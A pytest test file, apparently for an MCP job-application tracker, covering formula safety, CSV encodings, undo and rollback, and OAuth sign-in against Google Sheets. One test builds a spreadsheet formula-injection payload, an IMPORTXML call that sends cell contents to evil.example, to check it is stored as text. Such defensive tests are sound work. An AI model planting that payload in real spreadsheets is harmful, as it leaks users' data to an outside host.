"""Formula safety, odd inputs and failures in every store (from the 0.3.0 review)."""

import json
import os
import sys
import threading
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime
from pathlib import Path

import openpyxl
import pytest

from tracker_mcp import gsheets, server
from tracker_mcp.config import load_config
from tracker_mcp.scaffold import init, new_tracker
from tracker_mcp.stores import open_store
from tracker_mcp.tracker import Tracker, TrackerError

from .fake_sheets import FakeSheets
from .test_tracker import TODAY

URL = "https://docs.google.com/spreadsheets/d/abc123XYZ/edit#gid=0"
HEADERS = ["Company", "Role", "Status", "Date Applied", "Follow-up date", "Follow-up log", "Notes"]


def sheets(monkeypatch, tmp_path, data, dropdowns=None) -> FakeSheets:
    monkeypatch.setenv("TRACKER_MCP_HOME", str(tmp_path / "home"))
    fake = FakeSheets(data, dropdowns=dropdowns)
    monkeypatch.setattr(gsheets, "http_transport", lambda auth: fake)
    return fake


@pytest.fixture
def jobs(tmp_path, monkeypatch):
    return sheets(monkeypatch, tmp_path, {
        "Jobs": [HEADERS,
                 ["Acme", "EM", "Applied", datetime(2026, 9, 1), datetime(2026, 9, 11), None, None],
                 ["Globex", "Head of Eng", "Wishlist", None, None, None, None]],
    }, dropdowns={"Jobs": {3: ["Wishlist", "Applied", "Interview", "Offer", "Rejected", "Ghosted"]}})


def tracker(target=URL):
    return Tracker(target, config=load_config(target), today=lambda: TODAY)


# ---------------------------------------------------------------- formulas in Google Sheets

def test_appending_to_text_that_starts_with_equals_keeps_it_text(jobs):
    init(URL)
    t = tracker()
    t.add_application("Initech", "VP", notes='=IMPORTXML("http://evil.example/?d=')
    t.set_status(4, "Interview", note='"&A2&B2,"//a")')
    assert jobs.kind("Jobs", 4, 7) == "stringValue"
    assert jobs.value("Jobs", 4, 7).startswith('=IMPORTXML("http://evil.example/?d=')


def test_appending_to_a_formula_cell_and_undoing_it(jobs):
    jobs.set("Jobs", 2, 7, '=HYPERLINK("https://acme.example/job","posting")')
    init(URL)
    t = tracker()
    t.set_status(2, "Interview", note="call on Monday")
    assert jobs.kind("Jobs", 2, 7) == "stringValue"       # the appended text is text, not a broken formula
    t.undo_last_write()
    assert jobs.value("Jobs", 2, 7) == '=HYPERLINK("https://acme.example/job","posting")'
    assert jobs.kind("Jobs", 2, 7) == "formulaValue"


def test_a_failed_check_rolls_back_with_cell_kinds(jobs, monkeypatch):
    jobs.set("Jobs", 2, 7, "=1+1")
    jobs.set("Jobs", 3, 7, "=not a formula", kind="stringValue")
    init(URL)
    t = tracker()
    monkeypatch.setattr(Tracker, "_verify", lambda self, saved, changes: (_ for _ in ()).throw(
        TrackerError("Verification failed")))
    for row in (2, 3):
        with pytest.raises(TrackerError, match="Verification failed"):
            t.set_status(row, "Interview", note="call")
    assert jobs.value("Jobs", 2, 7) == "=1+1" and jobs.kind("Jobs", 2, 7) == "formulaValue"
    assert jobs.value("Jobs", 3, 7) == "=not a formula" and jobs.kind("Jobs", 3, 7) == "stringValue"
    assert jobs.value("Jobs", 2, 3) == "Applied"


# ---------------------------------------------------------------- odd Google Sheets

def test_tab_titles_openpyxl_refuses(tmp_path, monkeypatch):
    fake = sheets(monkeypatch, tmp_path, {
        "Jobs/2026": [HEADERS, ["Acme", "EM", "Applied", datetime(2026, 9, 1), None, None, "a\x0bb"]],
        "Archive: 2025": [["Company"], ["Old Co"]],
    })
    init(URL)
    t = tracker()
    assert t.describe()["data_rows"] == "2–2"
    t.add_application("Globex", "EM")
    assert fake.value("Jobs/2026", 3, 1) == "Globex"
    assert t.get_application("Acme")["applications"][0]["notes"] == "a b"   # control character dropped


def test_both_url_forms_name_the_same_sheet():
    assert gsheets.sheet_id("https://docs.google.com/spreadsheets/u/1/d/abc_-1/edit") == "abc_-1"
    assert gsheets.sheet_id(URL) == "abc123XYZ"


def test_no_network_is_a_readable_error(monkeypatch):
    class Auth:
        def header(self):
            return "Bearer x"

    def offline(*args, **kwargs):
        raise urllib.error.URLError("Name or service not known")

    monkeypatch.setattr(urllib.request, "urlopen", offline)
    with pytest.raises(TrackerError, match="Could not reach Google Sheets"):
        gsheets.http_transport(Auth())("GET", "https://sheets.googleapis.com/x", None)


def test_a_write_that_cannot_be_read_back_is_logged_and_not_undone(jobs, monkeypatch):
    init(URL)
    t = tracker()
    real = jobs.__call__
    state = {"posted": False}

    def flaky(method, url, body):
        if method == "POST":
            state["posted"] = True
        elif state["posted"]:
            raise TrackerError("Google Sheets error 429: quota")
        return real(method, url, body)

    monkeypatch.setattr(gsheets.time, "sleep", lambda s: None)
    t.store._call = flaky
    with pytest.raises(TrackerError, match="Do not repeat"):
        t.set_status(3, "Interview")
    assert jobs.value("Jobs", 3, 3) == "Interview"        # it did land
    entry = t.recent_writes(1)["writes"][0]
    assert entry["tool"] == "set_status" and entry["unverified"]
    t.store._call = real
    with pytest.raises(TrackerError, match="could not be checked"):
        t.undo_last_write()


def test_sign_in_ignores_strangers_and_keeps_the_token_private(tmp_path, monkeypatch):
    secret = tmp_path / "client.json"
    secret.write_text(json.dumps({"installed": {"client_id": "cid", "client_secret": "cs"}}), encoding="utf-8")
    seen = []

    def browser(url):
        q = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(url).query))
        redirect, state = q["redirect_uri"], q["state"]

        def visit():
            for query in ("error=access_denied", "state=forged&code=evil", f"state={state}&code=good"):
                try:
                    urllib.request.urlopen(f"{redirect}?{query}", timeout=5).read()
                    seen.append(200)
                except urllib.error.HTTPError as e:
                    seen.append(e.code)
        threading.Thread(target=visit, daemon=True).start()
        return True

    exchanged = {}

    def post(url, fields):
        exchanged.update(fields)
        return {"refresh_token": "r", "access_token": "a"}

    monkeypatch.setattr(gsheets.webbrowser, "open", browser)
    monkeypatch.setattr(gsheets, "_post_form", post)
    monkeypatch.setenv("NO_PROXY", "127.0.0.1")
    monkeypatch.setenv("no_proxy", "127.0.0.1")
    token, picked = gsheets.login(secret, token_file=tmp_path / "home" / "google-token.json")
    assert exchanged["code"] == "good" and seen == [404, 404, 200]
    assert json.loads(token.read_text(encoding="utf-8"))["refresh_token"] == "r"
    if sys.platform != "win32":
        assert token.stat().st_mode & 0o777 == 0o600


# ---------------------------------------------------------------- files

def test_other_spreadsheet_formats_are_refused_up_front(tmp_path):
    for name in ("t.xlsm", "t.xls", "t.ods", "t.numbers"):
        with pytest.raises(TrackerError, match="Save a copy of the tracker as .xlsx"):
            open_store(tmp_path / name)
    broken = tmp_path / "broken.xlsx"
    broken.write_text("not a zip", encoding="utf-8")
    with pytest.raises(TrackerError, match="not a readable .xlsx"):
        open_store(broken).load()


def test_a_windows_csv_keeps_its_encoding_and_line_endings(tmp_path):
    path = tmp_path / "jobs.csv"
    path.write_bytes("Company;Role;Status;Notes\n"
                     "Café Ltd;EM;Applied;naïve\x0b note\n".encode("cp1252"))
    init(path)
    t = tracker(path)
    assert t.get_application("Café")["applications"][0]["notes"] == "naïve  note"
    t.add_application("Société", "VP")
    data = path.read_bytes()
    assert b"\r\n" not in data and "Société;VP".encode("cp1252") in data
    with pytest.raises(TrackerError, match="CSV UTF-8"):
        t.add_application("Яндекс", "EM")                  # not in cp1252
    assert "Société" in path.read_bytes().decode("cp1252")


def test_first_start_with_a_symlinked_tracker(tmp_path, monkeypatch):
    real_dir, link_dir = tmp_path / "real", tmp_path / "link"
    real_dir.mkdir()
    link_dir.mkdir()
    book, cfg = new_tracker(real_dir / "jobs.xlsx")
    cfg.unlink()
    link = link_dir / "jobs.xlsx"
    try:
        os.symlink(book, link)
    except OSError:
        pytest.skip("no symlinks here")
    monkeypatch.setenv("TRACKER_PATH", str(link))
    monkeypatch.delenv("TRACKER_CONFIG", raising=False)
    for name, value in (("_tracker", None), ("_watch", None), ("_generated", None)):
        monkeypatch.setattr(server, name, value)
    assert server._describe()["config_generated"]["file"] == str(link_dir / "jobs.tracker-mcp.toml")


def test_summary_text_starting_with_equals_is_not_treated_as_a_formula(tmp_path):
    book, _ = new_tracker(tmp_path / "jobs.xlsx")
    wb = openpyxl.load_workbook(book)
    summary = [n for n in wb.sheetnames if n != load_config(book).sheet][0]
    cell = wb[summary]["H1"]
    cell.value = "=Applications!C2:C5 is how it is counted"
    cell.data_type = "s"
    wb.save(book)
    t = tracker(book)
    t.add_application("Acme", "EM")
    wb = openpyxl.load_workbook(book)
    assert wb[summary]["H1"].value == "=Applications!C2:C5 is how it is counted"
    assert wb[summary]["H1"].data_type == "s"


# ---------------------------------------------------------------- second review

def test_a_lost_reply_is_checked_before_saying_anything(jobs, monkeypatch):
    init(URL)
    t = tracker()
    jobs.fail_next_post = TrackerError("Could not reach Google Sheets (timed out).")
    with pytest.raises(TrackerError, match="may have been written"):
        t.set_status(3, "Interview")
    assert t.recent_writes(1)["writes"][0]["unverified"]

    real = t.store._call

    def refused(method, url, body):   # rejected before anything was applied
        if method == "POST":
            raise TrackerError("Google Sheets error 500: backend error.")
        return real(method, url, body)

    t.store._call = refused
    with pytest.raises(TrackerError, match="Nothing was saved"):
        t.set_status(2, "Interview")
    assert jobs.value("Jobs", 2, 3) == "Applied"


def test_cells_too_long_to_keep_block_writes(tmp_path, monkeypatch):
    sheets(monkeypatch, tmp_path, {"Jobs": [HEADERS, ["Acme", "EM", "Applied", None, None, None, "x" * 40000]]})
    init(URL)
    t = tracker()
    assert "more than 32767 characters" in t.describe()["writes_blocked"][0]
    with pytest.raises(TrackerError, match="Writes are off"):
        t.add_application("Globex", "EM")
    path = tmp_path / "long.csv"
    path.write_text("Company,Role,Status,Notes\nAcme,EM,Applied," + "y" * 40000 + "\n", encoding="utf-8")
    init(path)
    with pytest.raises(TrackerError, match="Writes are off"):
        tracker(path).add_application("Globex", "EM")
    assert len(path.read_text(encoding="utf-8")) > 40000


def test_bom_and_windows_encoding_together(tmp_path):
    path = tmp_path / "jobs.csv"
    path.write_bytes(b"\xef\xbb\xbf" + "Company,Role,Status\r\nCafé,EM,Applied\r\n".encode("cp1252"))
    init(path)
    t = tracker(path)
    assert t.describe()["columns"]["company"] == "A: Company"
    t.add_application("Société", "VP")
    t.add_application("Hooli", "VP")
    data = path.read_bytes()
    assert data.startswith(b"\xef\xbb\xbfCompany") and data.count(b"\xef\xbb\xbf") == 1


def test_a_cyrillic_csv_in_a_windows_code_page_is_refused(tmp_path):
    path = tmp_path / "jobs.csv"
    path.write_bytes("Компания;Роль;Статус\nЯндекс;Руководитель;Подано\n".encode("cp1251"))
    with pytest.raises(TrackerError, match="CSV UTF-8"):
        open_store(path).load()


def test_line_endings_follow_the_first_row(tmp_path):
    path = tmp_path / "jobs.csv"
    path.write_bytes(b'Company,Role,Status,Notes\nAcme,EM,Applied,"two\r\nlines"\n')
    init(path)
    tracker(path).add_application("Globex", "EM")
    data = path.read_bytes()
    assert data.count(b"\r\n") == 1 and data.endswith(b"Globex,EM,Not applied,\n")


def test_tab_titles_that_differ_only_in_case(tmp_path, monkeypatch):
    fake = sheets(monkeypatch, tmp_path, {"a/b": [["x"]], "A_B": [HEADERS, ["Acme", "EM", "Applied"]]})
    init(URL)
    assert load_config(URL).sheet == "A_B"
    tracker().add_application("Globex", "EM")
    assert fake.value("A_B", 3, 1) == "Globex" and fake.value("a/b", 3, 1) is None


def test_the_config_keeps_the_real_tab_title(tmp_path, monkeypatch):
    fake = sheets(monkeypatch, tmp_path, {
        "Jobs/2026": [HEADERS, ["Acme", "EM", "Applied"]],
        "Stats": [["Applied", "=COUNTIF('Jobs/2026'!C2:C2,\"Applied\")"]],
    })
    init(URL)
    cfg = load_config(URL)
    assert cfg.sheet == "Jobs/2026" and cfg.summary_sheet == "Stats"
    init(URL, sheet="Jobs/2026", force=True)
    tracker().add_application("Globex", "EM")
    assert fake.value("Stats", 1, 2) == "=COUNTIF('Jobs/2026'!C2:C103,\"Applied\")"
    assert fake.kind("Stats", 1, 2) == "formulaValue"


def test_undo_of_a_date_written_over_a_number_restores_the_format(jobs):
    jobs.set("Jobs", 3, 4, 7)                              # a plain number in the date column
    store = gsheets.SheetsStore(URL, transport=jobs)
    wb, before, _ = store.load()
    wb["Jobs"].cell(3, 4).value = datetime(2026, 10, 18)
    backup, _ = store.save(wb, before, lambda saved: None)
    assert jobs.is_date("Jobs", 3, 4)
    store.restore(backup)
    assert jobs.value("Jobs", 3, 4) == 7 and not jobs.is_date("Jobs", 3, 4)
    assert store.version() == before


# ---------------------------------------------------------------- reschedule_followup

def test_reschedule_and_drop_a_follow_up(tmp_path):
    from .test_tracker import ru_tracker
    t = ru_tracker(tmp_path / "t.xlsx")
    due = {a["row"] for a in t.followups_due(60)["due"]}
    row = sorted(due)[0]
    later = TODAY.replace(day=28)
    res = t.reschedule_followup(row, later, "ждём кредиты InMail")
    assert {c["field"] for c in res["changes"]} == {"followup_on", "followup_log"}
    app = t.get_application(row=row)["applications"][0]
    assert app["followup_on"] == later.isoformat() and "перенесён на" in app["followup_log"]
    t.reschedule_followup(row, None, "контакта нет")
    assert row not in {a["row"] for a in t.followups_due(60)["due"]}
    assert t.get_application(row=row)["applications"][0]["followup_log"].endswith("фоллоу-ап снят — контакта нет")
    with pytest.raises(TrackerError, match="in the past"):
        t.reschedule_followup(row, TODAY.replace(day=1), "x")
    with pytest.raises(TrackerError, match="Say why"):
        t.reschedule_followup(row, later, " ")


def test_funnel_groups_for_one_column(tmp_path):
    from .test_tracker import ru_tracker
    t = ru_tracker(tmp_path / "t.xlsx")
    before = t.funnel(by="status")["groups"]
    assert len(before) > 1
    t.cfg = t.cfg.model_copy(update={"funnel": t.cfg.funnel.model_copy(update={"by": {"status": {"Всё": [""]}}})})
    after = t.funnel(by="status")["groups"]
    assert [g["group"] for g in after] == ["Всё"] and after[0]["applied"] == sum(g["applied"] for g in before)


def test_sign_in_with_the_picker_sets_up_the_picked_sheet(tmp_path, monkeypatch, capsys):
    """`tracker-mcp auth google`: built-in client, drive.file, Google's picker, then init."""
    from tracker_mcp.scaffold import cli
    fake = sheets(monkeypatch, tmp_path, {"Jobs": [HEADERS, ["Acme", "EM", "Applied"]]})
    monkeypatch.setattr(gsheets, "BUILTIN_CLIENT", {"client_id": "builtin", "client_secret": "public"})
    monkeypatch.delenv("TRACKER_GOOGLE_CLIENT", raising=False)
    seen = {}

    def browser(url):
        q = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(url).query))
        seen.update(q)
        target = f"{q['redirect_uri']}?state={q['state']}&code=c&picked_file_ids=abc123XYZ"
        threading.Thread(target=lambda: urllib.request.urlopen(target, timeout=5).read(), daemon=True).start()
        return True

    monkeypatch.setattr(gsheets.webbrowser, "open", browser)
    posted = []

    def post(url, fields):
        posted.append(fields)
        return {"refresh_token": "r", "access_token": "a"}

    monkeypatch.setattr(gsheets, "_post_form", post)
    monkeypatch.setenv("NO_PROXY", "127.0.0.1")
    monkeypatch.setenv("no_proxy", "127.0.0.1")
    assert cli(["auth", "google"]) == 0
    # Google requires a Desktop client's secret at the token endpoint even with PKCE
    assert posted[0]["client_secret"] == "public" and posted[0]["code_verifier"]
    assert seen["scope"] == gsheets.FILE_SCOPE and seen["trigger_onepick"] == "true"
    assert seen["mimetypes"] == gsheets.SHEET_MIME and seen["client_id"] == "builtin"
    out = capsys.readouterr().out
    assert "Wrote" in out and '"TRACKER_PATH": "https://docs.google.com/spreadsheets/d/abc123XYZ/edit"' in out
    token = json.loads((tmp_path / "home" / "google-token.json").read_text(encoding="utf-8"))
    assert token["scope"] == gsheets.FILE_SCOPE
    assert load_config(URL).sheet == "Jobs" and fake.calls


def test_without_a_built_in_client_the_message_says_what_to_do(monkeypatch):
    monkeypatch.setattr(gsheets, "BUILTIN_CLIENT", None)
    monkeypatch.delenv("TRACKER_GOOGLE_CLIENT", raising=False)
    with pytest.raises(TrackerError, match="--client-secret"):
        gsheets.login()


def test_the_built_in_client_comes_from_the_release_build(monkeypatch):
    """The secret is written to _google_client.py by the release build, never kept in git."""
    import types
    monkeypatch.delitem(sys.modules, "tracker_mcp._google_client", raising=False)
    if (Path(gsheets.__file__).parent / "_google_client.py").exists():
        pytest.skip("a built copy: the module is there")
    assert gsheets._builtin_client() is None
    built = types.ModuleType("tracker_mcp._google_client")
    built.CLIENT_SECRET = "from-the-build"
    monkeypatch.setitem(sys.modules, "tracker_mcp._google_client", built)
    assert gsheets._builtin_client() == {"client_id": gsheets.BUILTIN_CLIENT_ID, "client_secret": "from-the-build"}
    built.CLIENT_SECRET = ""
    assert gsheets._builtin_client() is None
    ignored = (Path(__file__).parents[1] / ".gitignore").read_text(encoding="utf-8")
    assert "src/tracker_mcp/_google_client.py" in ignored.splitlines()
